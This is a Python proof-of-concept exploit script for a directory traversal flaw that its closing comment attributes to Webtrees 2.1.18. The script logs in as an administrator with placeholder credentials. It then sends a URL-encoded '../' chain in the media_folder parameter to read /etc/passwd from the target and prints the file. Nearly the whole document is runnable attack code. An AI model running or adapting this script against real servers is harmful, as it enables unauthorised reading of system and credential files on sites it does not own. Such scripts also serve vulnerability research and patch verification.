import requests
from urllib.parse import quote

# Target URL
target_url = "http://target-webtrees-instance.com"

# Administrator credentials
admin_username = "admin"
admin_password = "password"

# File to access (e.g., /etc/passwd)
sensitive_file_path = "/etc/passwd"

# Directory traversal payload
traversal_payload = "../../../../../../.."  # Adjust the depth as necessary

# URL encode the payload and the sensitive file path
encoded_traversal = quote(traversal_payload)
encoded_file_path = quote(sensitive_file_path)

# Complete URL with the directory traversal payload
exploit_url = f"{target_url}/index.php?media_folder={encoded_traversal}&file={encoded_file_path}"

# Function to perform login and get session cookie
def login_and_get_cookie():
    login_url = f"{target_url}/login.php"
    payload = {
        'username': admin_username,
        'password': admin_password
    }
    session = requests.Session()
    response = session.post(login_url, data=payload)
    return session

# Function to perform the directory traversal attack
def exploit(session):
    response = session.get(exploit_url)
    if response.status_code == 200:
        print("[+] Exploit successful!")
        print("[+] Sensitive file content:")
        print(response.text)
    else:
        print("[-] Exploit failed.")
        print(f"[-] HTTP Status Code: {response.status_code}")

# Main execution
if __name__ == "__main__":
    session = login_and_get_cookie()
    if session:
        exploit(session)
    else:
        print("[-] Failed to login as administrator.")
'''Webtrees 2.1.18 is vulnerable to Directory Traversal. 
  By manipulating the "media\_folder" parameter in the URL, an attacker (in this case, an administrator) can navigate beyond the intended directory
 (the 'media/' directory) to access sensitive files in other parts of the application's file system.
 '''